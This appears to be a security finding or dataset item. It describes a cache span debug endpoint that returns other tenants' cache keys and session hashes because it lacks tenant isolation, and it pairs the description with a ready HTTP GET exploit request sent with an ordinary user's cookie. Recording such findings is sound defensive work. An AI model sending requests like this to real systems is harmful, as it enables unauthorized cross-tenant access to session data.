diagnosis: The cache span inspection endpoint returns distributed cache span attributes by cacheSpanId without enforcing tenant isolation. An attacker can inspect cache keys, hit rates, and serialized session hashes across tenants, enabling cache-timing attacks and key enumeration.
exploit_request:
GET /debug/spans/cache/span_redis_session_hash_9918 HTTP/1.1
Host: redis-telemetry.internal:5051
Cookie: session_id=sess_regular_user
Accept: application/json
